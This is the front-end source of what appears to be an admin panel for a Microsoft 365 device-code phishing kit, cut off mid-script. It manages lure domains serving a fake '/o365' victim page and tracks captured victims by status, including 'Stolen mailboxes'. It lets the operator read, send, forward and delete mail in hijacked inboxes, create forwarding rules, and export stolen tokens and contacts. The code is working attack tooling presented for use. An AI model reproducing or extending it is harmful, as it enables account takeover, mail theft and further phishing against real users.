.panel{border-radius:12px}.modal-box{border-radius:14px;box-shadow:0 18px 60px rgba(2,8,20,.35)}
body.theme-dark .modal-box{box-shadow:0 18px 60px rgba(0,0,0,.6)}
.folders{background:rgba(240,244,251,.55);border-right-color:rgba(13,60,120,.12);backdrop-filter:blur(14px)}
body.theme-dark .folders{background:rgba(10,17,30,.8);border-right-color:rgba(120,165,255,.12)}
.frow.on{background:rgba(37,99,235,.14);box-shadow:0 0 0 1px rgba(37,99,235,.25)}
.mrow:hover{background:rgba(37,99,235,.06)}
body.theme-dark .mrow:hover{background:rgba(96,165,250,.08)}
#client-table th,.ctable th,.claims th,.tok .tlabel{background:rgba(233,240,250,.8);color:#64748b}
body.theme-dark #client-table th,body.theme-dark .ctable th,body.theme-dark .claims th,body.theme-dark .tok .tlabel{background:rgba(12,19,33,.9);color:#7d8fa8}
#client-table td,.ctable td,.mrow,.att-row{border-bottom-color:rgba(13,60,120,.1)}
body.theme-dark #client-table td,body.theme-dark .ctable td,body.theme-dark .mrow,body.theme-dark .att-row{border-bottom-color:rgba(120,165,255,.1)}
#client-table tr:hover td,.ctable tr:hover td{background:rgba(37,99,235,.06)}
#client-table th{border-radius:6px 6px 0 0}
.pill.pending{background:#fef3c7;color:#b45309}
.pill.error,.pill.expired,.pill.declined{background:#fee2e2;color:#b91c1c}
.pill.ok,.pill.stolen{background:#d1fae5;color:#047857}
body.theme-dark .pill.pending{background:rgba(251,191,36,.14);color:#fbbf24}
body.theme-dark .pill.error,body.theme-dark .pill.expired,body.theme-dark .pill.declined{background:rgba(255,107,107,.14);color:#ff8f8f}
body.theme-dark .pill.ok,body.theme-dark .pill.stolen{background:rgba(52,211,153,.14);color:#34d399}
.errtip{background:#fee2e2;color:#b91c1c;border-bottom-color:#fecaca}
body.theme-dark .errtip{background:rgba(255,107,107,.12);color:#ff9a9a;border-bottom-color:rgba(255,107,107,.25)}
.hint{background:rgba(191,219,254,.55);border:1px solid rgba(37,99,235,.25);color:#1e3a8a;border-radius:8px;backdrop-filter:blur(8px)}
body.theme-dark .hint{background:rgba(15,32,54,.8);border-color:rgba(59,130,246,.3);color:#a9c9ec}
input[type=text],textarea,select.field,#f-body.f-edit{background:rgba(255,255,255,.7);border-color:rgba(13,60,120,.18);border-radius:6px;color:#101828}
body.theme-dark input[type=text],body.theme-dark textarea,body.theme-dark select.field,body.theme-dark #f-body.f-edit{background:rgba(10,18,32,.85);color:#e6edf6;border-color:#223451;color-scheme:dark}
input[type=text]:focus,textarea:focus,select.field:focus,#f-body.f-edit:focus{border-color:#3b82f6;box-shadow:0 0 0 3px rgba(59,130,246,.18)}
.btn-primary{background:linear-gradient(135deg,#2563eb,#3b82f6);border-radius:6px}
.btn-primary:hover{background:linear-gradient(135deg,#3b82f6,#60a5fa)}
.btn-sec{background:rgba(255,255,255,.6);border-radius:6px;color:#16324f}
body.theme-dark .btn-sec{background:rgba(13,22,38,.85);color:#dbe6f3;border-color:#22304a}
.btn-sec:hover{background:rgba(37,99,235,.12)}
body.theme-dark .btn-sec:hover{background:rgba(96,165,250,.15)}
.cmp-row .cmp-tog button,.fheadbtns button,.dchip a,.rp-body a{color:var(--blue)}
#toast{background:rgba(15,25,45,.92);backdrop-filter:blur(14px);border:1px solid rgba(96,165,250,.3);box-shadow:0 10px 30px rgba(0,0,0,.4);color:#e6edf6;border-radius:8px}
.asub span{background:rgba(233,240,250,.8);border-color:rgba(13,60,120,.12)}
body.theme-dark .asub span{background:rgba(16,27,46,.9);border-color:#22304a}
.att,.att-wrap{background:rgba(255,255,255,.55);border-radius:6px}
body.theme-dark .att,body.theme-dark .att-wrap{background:rgba(13,22,38,.8)}
.fmt-bar{background:rgba(233,240,250,.7);border-radius:6px 6px 0 0}
body.theme-dark .fmt-bar{background:rgba(12,19,33,.85)}
.fmt-bar .fmt-btn{background:rgba(255,255,255,.6)}
body.theme-dark .fmt-bar .fmt-btn{background:rgba(10,18,32,.85);color:#dbe6f3;border-color:#22304a}
.fmt-bar .fmt-btn:active{background:#dbeafe}
body.theme-dark .fmt-bar .fmt-btn:active{background:#132a4e}
.statstrip b{color:var(--text)}
#client-table th,.ctable th{color:#64748b}
body.theme-dark #client-table th,body.theme-dark .ctable th{color:#7d8fa8}
.mrow.unread .msub,.mrow.unread .mfr{font-weight:700}
.folders{border-radius:0}
.errtip,.hint{border-radius:0 0 6px 6px}
#toast{border-radius:8px}
input[type=text],textarea,select.field{border-radius:6px}
::-webkit-scrollbar{width:10px;height:10px}
::-webkit-scrollbar-track{background:transparent}
::-webkit-scrollbar-thumb{background:rgba(37,99,235,.3);border-radius:5px;border:2px solid transparent;background-clip:padding-box}
::-webkit-scrollbar-thumb:hover{background:rgba(37,99,235,.5)}
body.theme-dark ::-webkit-scrollbar-thumb{background:rgba(96,165,250,.3);background-clip:padding-box}
body.theme-dark ::-webkit-scrollbar-track{background:#0b0f16}
select option{background:#fff;color:#101828}
/* ---- styled confirm/prompt + attachment viewer ---- */
.ui-ov{position:fixed;inset:0;background:rgba(4,10,22,.55);backdrop-filter:blur(4px);display:none;align-items:center;justify-content:center;z-index:200}
.ui-ov.on{display:flex}
.ui-card{background:rgba(255,255,255,.92);backdrop-filter:blur(18px);border:1px solid rgba(37,99,235,.25);border-radius:14px;box-shadow:0 24px 70px rgba(2,8,20,.45);width:420px;max-width:92vw;padding:22px 24px}
.ui-card h3{font-size:16px;margin-bottom:8px;color:#0f1c33}
.ui-card p{font-size:13.5px;color:#33415c;line-height:1.5;margin-bottom:12px}
.ui-card input{width:100%;padding:9px 11px;border:1px solid rgba(13,60,120,.25);border-radius:8px;font-size:14px;margin-bottom:6px;outline:none;background:rgba(255,255,255,.8)}
.ui-card input:focus{border-color:#3b82f6;box-shadow:0 0 0 3px rgba(59,130,246,.18)}
.ui-hint{font-size:12px;color:#b91c1c;margin-bottom:10px;display:none}
.ui-btns{display:flex;gap:10px;justify-content:flex-end;margin-top:14px}
.ui-btns button{padding:8px 18px;border-radius:8px;font-size:13px;font-weight:600;cursor:pointer;border:1px solid rgba(13,60,120,.2);background:rgba(255,255,255,.7);color:#16324f}
.ui-btns .ui-ok{background:linear-gradient(135deg,#2563eb,#3b82f6);color:#fff;border:none}
.ui-btns .ui-ok.danger{background:linear-gradient(135deg,#dc2626,#ef4444)}
.ui-btns button:hover{filter:brightness(1.08)}
body.theme-dark .ui-card{background:rgba(13,20,34,.92);border-color:rgba(120,165,255,.2)}
body.theme-dark .ui-card h3{color:#e6edf6}
body.theme-dark .ui-card p{color:#aebad0}
body.theme-dark .ui-card input{background:rgba(10,18,32,.85);color:#e6edf6;border-color:#223451}
body.theme-dark .ui-btns button{background:rgba(13,22,38,.85);color:#dbe6f3;border-color:#22304a}
body.theme-dark .ui-btns .ui-ok{background:linear-gradient(135deg,#2563eb,#3b82f6);color:#fff}
body.theme-dark .ui-btns .ui-ok.danger{background:linear-gradient(135deg,#dc2626,#ef4444)}
/* Outlook-style reading pane card */
.rp-card{background:#fff;border:1px solid #e1e5eb;border-radius:8px;box-shadow:0 1px 6px rgba(16,40,80,.08);padding:20px 26px;margin:14px 16px 20px;color:#242424;font-size:14px;line-height:1.55;word-break:break-word}
.rp-card img{max-width:100%}
.rp-card a{color:#0f6cbd}
body.theme-dark .rp-card{background:#152238;border-color:#223452;color:#dbe6f3;box-shadow:0 1px 8px rgba(0,0,0,.4)}
body.theme-dark .rp-card a{color:#60a5fa}
/* attachment viewer (same window) */
.att-ov{position:fixed;inset:0;background:rgba(4,10,22,.72);backdrop-filter:blur(5px);display:none;z-index:210}
.att-ov.on{display:flex;flex-direction:column}
.att-bar{display:flex;align-items:center;gap:12px;padding:10px 16px;background:rgba(13,22,38,.95);color:#e6edf6;border-bottom:1px solid rgba(120,165,255,.18)}
.att-bar .att-title{font-size:13.5px;font-weight:600;flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.att-bar button{padding:7px 14px;border-radius:7px;font-size:12.5px;font-weight:600;cursor:pointer;border:1px solid rgba(120,165,255,.3);background:rgba(96,165,250,.14);color:#bfdbfe}
.att-bar .att-dl{background:linear-gradient(135deg,#2563eb,#3b82f6);color:#fff;border:none}
.att-frame{flex:1;border:none;background:#fff}
body.theme-dark .att-frame{background:#0d1626}
/* dark-mode text fixes: elements with hardcoded light-theme colors */
body.theme-dark h1,body.theme-dark h2,body.theme-dark h3,body.theme-dark h4,body.theme-dark td,body.theme-dark th,body.theme-dark .rp-body,body.theme-dark .cfgrow .v,body.theme-dark .cmp-row,body.theme-dark .mgroup,body.theme-dark .fav-label,body.theme-dark .att-row,body.theme-dark .frow,body.theme-dark .msub,body.theme-dark .mfr,body.theme-dark .mwhen,body.theme-dark .who .name,body.theme-dark .who .addr,body.theme-dark .rp-to,body.theme-dark .rp-from h2,body.theme-dark .when,body.theme-dark label,body.theme-dark .cfgrow .k{color:#e6edf6}
body.theme-dark .cbar .cbtn,body.theme-dark .mhead button{color:#dbe6f3}
body.theme-dark .empty{color:#8b98ab}
body.theme-dark .sessbar,body.theme-dark .cbar{color:#e6edf6}

body.theme-dark select option{background:#0d1626;color:#e6edf6}
</style>
</head>
<body>
<div id="app">
  <header class="ribbon">
    <div class="waffle" title="Apps"><svg viewBox="0 0 16 16"><circle cx="2" cy="2" r="1.2"/><circle cx="8" cy="2" r="1.2"/><circle cx="14" cy="2" r="1.2"/><circle cx="2" cy="8" r="1.2"/><circle cx="8" cy="8" r="1.2"/><circle cx="14" cy="8" r="1.2"/><circle cx="2" cy="14" r="1.2"/><circle cx="8" cy="14" r="1.2"/><circle cx="14" cy="14" r="1.2"/></svg></div>
    <div class="rbrand">
      <div class="olog"><svg viewBox="0 0 24 24"><rect x="2" y="4" width="20" height="16" rx="2" fill="#0078d4"/><path d="M4 7l8 6 8-6" stroke="#fff" stroke-width="1.6" fill="none"/></svg></div>
      Microsoft
    </div>
    <div class="searchwrap"><input type="text" id="global-search" placeholder="Search" autocomplete="off"></div>
    <div class="racts">
      <button type="button" id="pagetab-clients" class="pagetab on">Domains &amp; Clients</button>
      <button type="button" id="pagetab-inbox" class="pagetab">Inbox</button>
      <span class="psep"></span>
      <button type="button" id="extract-btn" class="primary">Extract contacts</button>
      <button type="button" id="export-btn">Export tokens</button>
      <button type="button" id="theme-btn" title="Toggle dark / light mode">&#9789;</button>
      <button type="button" id="config-btn">Config</button>
      <button type="button" id="clear-btn">Clear</button>
      <button type="button" id="refresh-btn">Refresh</button>
      <div class="acct-chip" id="acct-chip" title="Active mailbox">
        <div class="av2" id="acct-av">?</div>
        <div class="an" id="acct-name">No mailbox</div>
      </div>
    </div>
  </header>

  <div id="page-clients" class="page on">
    <div class="panel">
      <div class="phd">
        <h3>Domains</h3>
        <span class="dhelp">Domains this server is served from. Captured clients are tagged with the host they visited.</span>
      </div>
      <div class="pbd">
        <div class="dwrap">
          <input type="text" id="domain-input" placeholder="e.g. example.com" autocomplete="off" spellcheck="false">
          <button class="btn-primary" id="domain-add" type="button">Add domain</button>
        </div>
        <div id="domain-list"><div class="empty" style="padding:12px 0">No domains added yet.</div></div>
      </div>
    </div>
    <div class="panel" style="margin-top:14px">
      <div class="phd">
        <h3>Clients</h3>
        <div class="statstrip"><span>Pending <b id="cs-pending">0</b></span><span>Stolen <b id="cs-stolen">0</b></span><span>Errors <b id="cs-errors">0</b></span></div>
      </div>
      <div class="pbd" style="padding:0">
        <div style="overflow:auto">
          <table id="client-table">
            <thead><tr><th>Email</th><th>Status</th><th>Domain</th><th>Code</th><th>Captured</th><th>Actions</th></tr></thead>
            <tbody id="client-rows"></tbody>
          </table>
        </div>
      </div>
    </div>
  </div>

  <div id="page-inbox" class="page">
  <div class="sessbar">
    <label for="sess-select">Mailbox</label>
    <select id="sess-select"><option value="">No sessions</option></select>
    <div class="sessmeta" id="sess-meta">Select a victim session</div>
    <div class="statstrip" id="stat-strip"><span>Pending <b id="st-pending">0</b></span><span>Stolen <b id="st-stolen">0</b></span><span>Errors <b id="st-errors">0</b></span></div>
    <div class="sbtns">
      <button type="button" id="copy-link-btn">Copy link</button>
      <button type="button" id="del-sess-btn" class="danger">Delete</button>
    </div>
  </div>

  <div class="body">
    <nav class="nav">
      <button class="navbtn on" data-tab="mail" title="Mail"><svg viewBox="0 0 24 24"><path d="M20 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z"/></svg></button>
      <button class="navbtn" data-tab="contacts" title="People"><svg viewBox="0 0 24 24"><path d="M16 11c1.66 0 2.99-1.34 2.99-3S17.66 5 16 5s-3 1.34-3 3 1.34 3 3 3zm-8 0c1.66 0 2.99-1.34 2.99-3S9.66 5 8 5 5 6.34 5 8s1.34 3 3 3zm0 2c-2.33 0-7 1.17-7 3.5V19h14v-2.5c0-2.33-4.67-3.5-7-3.5zm8 0c-.29 0-.62.02-.97.05 1.16.84 1.97 1.97 1.97 3.45V19h6v-2.5c0-2.33-4.67-3.5-7-3.5z"/></svg></button>
      <button class="navbtn" data-tab="rules" title="Rules"><svg viewBox="0 0 24 24"><path d="M3 17v2h6v-2H3zM3 5v2h10V5H3zm10 16v-2h8v-2h-8v-2h-2v6h2zM7 9v2H3v2h4v2h2V9H7zm14 4v-2H11v2h10zm-6-4h2V7h4V5h-4V3h-2v6z"/></svg></button>
      <button class="navbtn" data-tab="tokens" title="Tokens"><svg viewBox="0 0 24 24"><path d="M12.65 10C11.83 7.67 9.61 6 7 6c-3.31 0-6 2.69-6 6s2.69 6 6 6c2.61 0 4.83-1.67 5.65-4H17v4h4v-4h2v-4H12.65zM7 14c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2z"/></svg></button>
    </nav>
    <div class="main">
      <div class="cbar" id="cbar-mail">
        <button class="cbtn primary" id="compose-btn">+ New mail</button>
        <div class="sep"></div>
        <button class="cbtn" id="reply-btn" disabled>Reply</button>
        <button class="cbtn" id="replyall-btn" disabled>Reply all</button>
        <button class="cbtn" id="fwd-btn" disabled>Forward</button>
        <div class="sep"></div>
        <button class="cbtn" id="read-btn" disabled>Mark read</button>
        <select class="cbtn-sel" id="move-folder" disabled title="Move selected message to another folder"><option value="">Move to…</option></select>
        <button class="cbtn danger" id="del-btn" disabled>Delete</button>
        <div class="sep"></div>
        <button class="cbtn" id="folders-ref">Refresh folder</button>
        <span style="flex:1"></span>
        <span id="folder-title" style="font-size:13px;color:var(--muted);font-weight:600"></span>
      </div>
      <div id="view-mail" class="on">
        <div class="folders">
          <div class="fhead"><span>Folders</span><span class="fheadbtns"><button type="button" id="folder-new" title="New folder">+ New</button><button type="button" id="folders-ref2" title="Refresh">&#8635;</button></span></div>
          <div id="flist"></div>
        </div>
        <div class="mlist">
          <div class="mhead"><input type="text" id="msearch" placeholder="Search mail"><button type="button" id="msearch-x">Clear</button></div>
          <div class="errtip" id="mail-err"></div>
          <div id="mlist"><div class="empty">Select a mailbox</div></div>
        </div>
        <div class="rpane" id="rpane">
          <div class="rp-empty" id="rp-empty"><div class="big">&#9993;</div><div>Select an item to read</div></div>
          <div id="rp-head" style="display:none"></div>
          <div id="attlist" style="display:none"></div>
          <div id="rp-body" style="display:none"></div>
        </div>
      </div>
      <div id="view-contacts"></div>
      <div id="view-rules"></div>
      <div id="view-tokens"></div>
    </div>
  </div>
  </div>
</div>

<div class="modal" id="m-compose">
  <div class="modal-box">
    <div class="mhead"><h3 id="compose-title">New message</h3><button class="x" data-close="m-compose">&times;</button></div>
    <div class="mbody">
      <div class="cmp-row"><span class="cmp-lbl">To</span><input type="text" id="f-to" placeholder="recipient@example.com"><span class="cmp-tog"><button type="button" id="f-tog-cc" title="Show Cc">Cc</button><button type="button" id="f-tog-bcc" title="Show Bcc">Bcc</button></span></div>
      <div class="cmp-row" id="f-cc-row" style="display:none"><span class="cmp-lbl">Cc</span><input type="text" id="f-cc" placeholder="cc@example.com"></div>
      <div class="cmp-row" id="f-bcc-row" style="display:none"><span class="cmp-lbl">Bcc</span><input type="text" id="f-bcc" placeholder="bcc@example.com"></div>
      <div class="cmp-row"><span class="cmp-lbl">Subject</span><input type="text" id="f-subj" placeholder="Subject"></div>
      <label class="f">Message</label>
      <div class="fmt-bar" id="fmt-bar">
        <button type="button" class="fmt-btn" data-cmd="bold" title="Bold"><b>B</b></button>
        <button type="button" class="fmt-btn" data-cmd="italic" title="Italic"><i>I</i></button>
        <button type="button" class="fmt-btn" data-cmd="underline" title="Underline"><u>U</u></button>
        <span class="fmt-sep"></span>
        <button type="button" class="fmt-btn" data-cmd="insertUnorderedList" title="Bullet list">&#8226; List</button>
        <button type="button" class="fmt-btn" data-cmd="insertOrderedList" title="Numbered list">1. List</button>
        <button type="button" class="fmt-btn" data-cmd="createLink" title="Insert link">&#128279; Link</button>
        <button type="button" class="fmt-btn" data-cmd="removeFormat" title="Clear formatting">&#8634; Clear</button>
        <span class="fmt-sep"></span>
        <button type="button" id="sig-btn" title="Insert signature" style="display:none">&#9998; Signature</button>
      </div>
      <div id="f-body" class="f-edit" contenteditable="true" data-placeholder="Write your message..."></div>
      <div class="f" style="margin-top:8px">
        <label for="f-att" class="btn-sec" style="display:inline-block;cursor:pointer">Attach files</label>
        <input type="file" id="f-att" multiple style="display:none">
      </div>
      <div id="f-attlist"></div>
    </div>
    <div class="mfoot">
      <button class="btn-sec" data-close="m-compose">Discard</button>
      <button class="btn-sec" id="save-draft-btn">Save draft</button>
      <button class="btn-primary" id="send-btn">Send</button>
    </div>
  </div>
</div>

<div class="modal" id="m-config">
  <div class="modal-box">
    <div class="mhead"><h3>Configuration</h3><button class="x" data-close="m-config">&times;</button></div>
    <div class="mbody">
      <div class="cfgrow"><div class="k">Client</div><div class="v" id="cfg-client">-</div></div>
      <div class="cfgrow"><div class="k">Flow</div><div class="v" id="cfg-flow">-</div></div>
      <div class="cfgrow"><div class="k">Scope / Resource</div><div class="v" id="cfg-scope">-</div></div>
      <div class="cfgrow"><div class="k">Log file</div><div class="v" id="cfg-log">-</div></div>
      <div class="cfgrow"><div class="k">Graph</div><div class="v" id="cfg-graph">-</div></div>
      <div class="cfgrow"><div class="k">Device page</div><div class="v" id="cfg-page">-</div></div>
    </div>
    <div class="mfoot"><button class="btn-sec" data-close="m-config">Close</button></div>
  </div>
</div>

<div class="modal" id="m-rule">
  <div class="modal-box">
    <div class="mhead"><h3 id="rule-title">New rule</h3><button class="x" data-close="m-rule">&times;</button></div>
    <div class="mbody">
      <label class="f">Name</label>
      <input type="text" id="r-name" placeholder="e.g. Move invoices to Archive">
      <label class="f">From (contains)</label>
      <input type="text" id="r-from" placeholder="sender@example.com">
      <label class="f">Subject contains</label>
      <input type="text" id="r-subj" placeholder="invoice">
      <label class="f">Move to folder</label>
      <select id="r-move" class="field">
        <option value="">(no move)</option>
      </select>
      <label class="f">Actions</label>
      <div class="checkrow"><input type="checkbox" id="r-read"><label for="r-read">Mark as read</label></div>
      <div class="checkrow"><input type="checkbox" id="r-del"><label for="r-del">Delete message</label></div>
      <div class="checkrow"><input type="checkbox" id="r-fwd"><label for="r-fwd">Forward to</label></div>
      <input type="text" id="r-fwdto" placeholder="forward@example.com" style="display:none">
      <div class="checkrow"><input type="checkbox" id="r-enabled" checked><label for="r-enabled">Rule enabled</label></div>
    </div>
    <div class="mfoot">
      <button class="btn-sec" data-close="m-rule">Cancel</button>
      <button class="btn-primary" id="rule-save">Save rule</button>
    </div>
  </div>
</div>

<div id="toast"></div>
<div class="ui-ov" id="ui-ov"><div class="ui-card"><h3 id="ui-msg-title"></h3><p id="ui-msg"></p><input type="text" id="ui-input" style="display:none" autocomplete="off"><div class="ui-hint" id="ui-hint"></div><div class="ui-btns"><button type="button" id="ui-cancel">Cancel</button><button type="button" class="ui-ok" id="ui-ok">OK</button></div></div></div>
<div class="att-ov" id="att-ov"><div class="att-bar"><span class="att-title" id="att-title">attachment</span><a id="att-dl-link" class="att-dl" download>Download</a><button type="button" id="att-close">Close</button></div><iframe class="att-frame" id="att-frame"></iframe></div>

<script>
'use strict';
var $ = function (id) { return document.getElementById(id); };
var state = { sessions: [], config: null, sel: null, folder: null, folders: [], msgs: [], cur: null, tab: 'mail', q: '', ruleEdit: null, contacts: null, sig: null, sigAppended: false, domains: [], page: 'clients' };

function esc(s) {
  return String(s == null ? '' : s).replace(/[&<>"']/g, function (c) {
    return ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'})[c];
  });
}
function sanitizeHtml(h) {
  // Reading pane renders attacker-controlled email HTML - strip scripts,
  // active/embedded content, form/svg and on* attributes so a crafted
  // message cannot XSS the admin session.
  if (!h) return '';
  var d = document.createElement('div');
  d.innerHTML = h;
  var bad = d.querySelectorAll('script,style,iframe,object,embed,link,meta,form,svg');
  for (var i = bad.length - 1; i >= 0; i--) bad[i].parentNode.removeChild(bad[i]);
  var els = d.getElementsByTagName('*');
  for (var j = els.length - 1; j >= 0; j--) {
    var el = els[j];
    var atts = el.attributes;
    for (var k = atts.length - 1; k >= 0; k--) {
      if (atts[k].name.toLowerCase().indexOf('on') === 0) el.removeAttribute(atts[k].name);
    }
    var href = el.getAttribute('href');
    if (href && !/^(https?:|mailto:|#)/i.test(href)) el.setAttribute('href', '#');
  }
  return d.innerHTML;
}
function fmtWhen(ts) {
  if (!ts) return '';
  var t = new Date(ts);
  if (isNaN(t)) return ts;
  var d = (Date.now() - t.getTime()) / 1000;
  if (d < 60) return 'just now';
  if (d < 3600) return Math.floor(d / 60) + 'm ago';
  if (d < 86400) return Math.floor(d / 3600) + 'h ago';
  return t.toLocaleDateString(undefined, { month: 'short', day: 'numeric' });
}
function fmtSize(b) {
  b = Number(b) || 0;
  if (b < 1024) return b + ' B';
  if (b < 1048576) return (b / 1024).toFixed(0) + ' KB';
  return (b / 1048576).toFixed(1) + ' MB';
}
function toast(msg) {
  var t = $('toast');
  t.textContent = msg;
  t.classList.add('show');
  clearTimeout(t._h);
  t._h = setTimeout(function () { t.classList.remove('show'); }, 2600);
}
function copyText(text) {
  if (!text) return;
  if (navigator.clipboard && navigator.clipboard.writeText) {
    navigator.clipboard.writeText(text).then(function () { toast('Copied'); }).catch(function () { fallbackCopy(text); });
  } else { fallbackCopy(text); }
}
function fallbackCopy(text) {
  var ta = document.createElement('textarea');
  ta.value = text; ta.style.position = 'fixed'; ta.style.opacity = '0';
  document.body.appendChild(ta); ta.select();
  try { document.execCommand('copy'); toast('Copied'); } catch (e) { toast('Copy failed'); }
  document.body.removeChild(ta);
}
function badgeHtml(status) {
  return '<span class="pill ' + esc(status) + '">' + esc(status) + '</span>';
}
function folderIcon(name) {
  var n = (name || '').toLowerCase();
  if (n.indexOf('inbox') >= 0) return '&#9993;';
  if (n.indexOf('sent') >= 0) return '&#10148;';
  if (n.indexOf('draft') >= 0) return '&#9998;';
  if (n.indexOf('junk') >= 0 || n.indexOf('spam') >= 0) return '&#9888;';
  if (n.indexOf('delete') >= 0 || n.indexOf('trash') >= 0) return '&#128465;';
  if (n.indexOf('archive') >= 0) return '&#128230;';
  return '&#128193;';
}
function setCmdEnabled(on) {
  ['reply-btn','replyall-btn','fwd-btn','read-btn','del-btn','move-folder'].forEach(function (id) {
    var b = $(id); if (b) b.disabled = !on;
  });
}
function showReading(show) {
  $('rp-empty').style.display = show ? 'none' : 'flex';
  $('rp-head').style.display = show ? 'block' : 'none';
  $('attlist').style.display = show ? 'flex' : 'none';
  $('rp-body').style.display = show ? 'block' : 'none';
}

function renderStats(st) {
  $('st-pending').textContent = st.pending || 0;
  $('st-stolen').textContent = st.success || 0;
  $('st-errors').textContent = (st.error || 0) + (st.expired || 0) + (st.declined || 0);
}

function renderSessionSelect(sessions) {
  var sel = $('sess-select');
  var cur = state.sel ? state.sel.sid : '';
  var html = '';
  if (!sessions.length) html = '<option value="">No victim mailboxes</option>';
  var groups = { success: [], pending: [], other: [] };
  sessions.forEach(function (s) {
    if (s.status === 'success') groups.success.push(s);
    else if (s.status === 'pending') groups.pending.push(s);
    else groups.other.push(s);
  });
  function addGroup(label, list) {
    if (!list.length) return;
    html += '<optgroup label="' + esc(label) + '">';
    list.forEach(function (s) {
      var mail = s.email || (s.status === 'pending' ? 'Waiting for sign-in…' : '(no email yet)');
      var code = s.user_code || (s.sid || '').slice(0, 8);
      var when = fmtWhen(s.completed_at || s.created);
      var label2 = mail + '  ·  ' + code + (when ? '  ·  ' + when : '');
      html += '<option value="' + esc(s.sid) + '"' + (s.sid === cur ? ' selected' : '') + '>' + esc(label2) + '</option>';
    });
    html += '</optgroup>';
  }
  addGroup('Stolen mailboxes', groups.success);
  addGroup('Waiting', groups.pending);
  addGroup('Other', groups.other);
  sel.innerHTML = html;
  if (cur) sel.value = cur;
  updateSessMeta();
}

function switchPage(p) {
  state.page = p;
  $('page-clients').classList.toggle('on', p === 'clients');
  $('page-inbox').classList.toggle('on', p === 'inbox');
  $('pagetab-clients').classList.toggle('on', p === 'clients');
  $('pagetab-inbox').classList.toggle('on', p === 'inbox');
  if (p === 'inbox' && state.sel) { state.folder = null; state.cur = null; onSessionChange(true); }
}

function renderDomains() {
  var list = state.domains || [];
  var counts = {};
  (state.sessions || []).forEach(function (s) {
    var h = String(s.host || '').replace(/:[0-9]+$/, '');
    if (h) counts[h] = (counts[h] || 0) + 1;
  });
  var el = $('domain-list');
  if (!list.length) {
    el.innerHTML = '<div class="empty" style="padding:12px 0">No domains added yet. Add the domains you serve this tool from.</div>';
    return;
  }
  var html = '';
  list.forEach(function (d) {
    var n = counts[d] || 0;
    var link = victimLink(d);
    html += '<span class="dchip"><a class="dname" href="' + esc(link) + '" target="_blank" rel="noopener" title="Open victim page"><b>' + esc(d) + '</b></a><span class="dcnt">' + n + (n === 1 ? ' session' : ' sessions') + '</span>'
      + '<a href="' + esc(link) + '" target="_blank" rel="noopener" title="Open victim page">' + esc(link) + '</a>'
      + '<button type="button" class="dcopy" data-copylink="' + esc(d) + '" title="Copy victim link">Copy link</button>'
      + '<button type="button" data-ddel="' + esc(d) + '" title="Remove domain">&times;</button></span>';
  });
  el.innerHTML = html;
  el.querySelectorAll('[data-ddel]').forEach(function (b) {
    b.addEventListener('click', function () { removeDomain(b.getAttribute('data-ddel')); });
  });
  el.querySelectorAll('[data-copylink]').forEach(function (b) {
    b.addEventListener('click', function () { copyText(victimLink(b.getAttribute('data-copylink'))); });
  });
}

function renderClients() {
  var rows = state.sessions || [];
  var st = { pending: 0, stolen: 0, errors: 0 };
  rows.forEach(function (s) {
    if (s.status === 'success') st.stolen++;
    else if (s.status === 'pending') st.pending++;
    else st.errors++;
  });
  $('cs-pending').textContent = st.pending;
  $('cs-stolen').textContent = st.stolen;
  $('cs-errors').textContent = st.errors;
  var tbody = $('client-rows');
  if (!rows.length) {
    tbody.innerHTML = '<tr><td colspan="6"><div class="empty" style="padding:24px">No sessions yet. Victims reach this server at <b>/o365</b>.</div></td></tr>';
    return;
  }
  var html = '';
  rows.forEach(function (s) {
    var email = s.email || (s.status === 'pending' ? 'Waiting for sign-in…' : '(no email)');
    var sel = (state.sel && state.sel.sid === s.sid) ? ' style="background:#c7e0f4"' : '';
    html += '<tr' + sel + '>'
      + '<td><b>' + esc(email) + '</b></td>'
      + '<td>' + badgeHtml(s.status) + '</td>'
      + '<td>' + esc(s.host || '—') + '</td>'
      + '<td>' + esc(s.user_code || '—') + '</td>'
      + '<td>' + esc(fmtWhen(s.completed_at || s.created)) + '</td>'
      + '<td><div class="cact">'
      + '<button type="button" class="cbtn-sm blue" data-cact="open" data-sid="' + esc(s.sid) + '">Open inbox</button>'
      + '<button type="button" class="cbtn-sm" data-cact="copy" data-sid="' + esc(s.sid) + '">Copy link</button>'
      + '<button type="button" class="cbtn-sm" data-cact="exp" data-sid="' + esc(s.sid) + '">Export</button>'
      + '<button type="button" class="cbtn-sm danger" data-cact="del" data-sid="' + esc(s.sid) + '">Delete</button>'
      + '</div></td></tr>';
  });
  tbody.innerHTML = html;
}

function addDomain() {
  var v = $('domain-input').value.trim();
  if (!v) {
    UI.prompt('Add domain', 'Enter a domain to add (e.g. example.com):', '', function (v2) {
      if (v2 && v2.trim()) { $('domain-input').value = v2.trim(); addDomain(); }
    });
    return;
  }
  fetch('/admin/api/domains', {
    method: 'POST', headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ domain: v })
  })
    .then(function (r) { return r.json(); })
    .then(function (d) {
      if (d.error) { toast('Failed: ' + d.error); return; }
      $('domain-input').value = '';
      state.domains = d.domains || state.domains;
      renderDomains();
      toast('Domain added');
    })
    .catch(function () { toast('Failed to add domain'); });
}

function removeDomain(d) {
  fetch('/admin/api/domains/' + encodeURIComponent(d), { method: 'DELETE' })
    .then(function (r) { return r.json(); })
    .then(function (res) {
      if (res.error) { toast('Failed: ' + res.error); return; }
      state.domains = res.domains || state.domains;
      renderDomains();
      toast('Domain removed');
    })
    .catch(function () { toast('Failed to remove domain'); });
}

function openInbox(sid) {
  var exists = state.sessions.some(function (s) { return s.sid === sid; });
  if (!exists) { toast('Session not found'); return; }
  window.open(window.location.pathname + '?inbox=' + encodeURIComponent(sid), '_blank');
  toast('Opening inbox in a new tab…');
}

function victimLink(domain) {
  var proto = window.location.protocol === 'https:' ? 'https' : 'http';
  var port = window.location.port ? ':' + window.location.port : '';
  return proto + '://' + domain + port + '/o365';
}

function updateSessMeta() {
  var s = state.sel;
  if (!s) {
    $('sess-meta').innerHTML = 'Select a victim mailbox from the dropdown';
    if ($('acct-name')) { $('acct-name').textContent = 'No mailbox'; $('acct-av').textContent = '?'; }
    return;
  }
  var email = s.email || '(no email)';
  var caps = [];
  if (s.status === 'success') {
